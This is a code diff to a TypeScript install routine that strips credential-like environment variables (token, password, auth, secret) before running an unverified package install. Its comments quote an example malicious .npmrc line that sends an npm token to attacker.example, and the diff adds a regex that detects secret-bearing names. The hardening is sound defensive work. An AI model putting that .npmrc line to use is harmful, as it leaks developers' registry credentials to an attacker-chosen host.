@@ -198,8 +198,13 @@ export async function installCindyMakeWorktree(
           // (`//attacker.example/:_authToken=${NPM_TOKEN}`) into a credential sent
           // to a registry the content chooses (see `UNVERIFIED_INSTALL_ENV`).
           ...Object.fromEntries(
-            Object.entries(deps.processEnvironment).filter(([key]) =>
-              UNVERIFIED_INSTALL_ENV.test(key),
+            Object.entries(deps.processEnvironment).filter(
+              ([key]) =>
+                UNVERIFIED_INSTALL_ENV.test(key) &&
+                // No credential survives even under an allowlisted prefix: a
+                // `COREPACK_NPM_TOKEN` is still a token a content `.npmrc`
+                // (`${COREPACK_NPM_TOKEN}`) can send to a registry of its choosing.
+                !/(?:token|password|auth|secret|credential)/i.test(key),
             ),
           ),
           npm_config_userconfig: os.devNull,
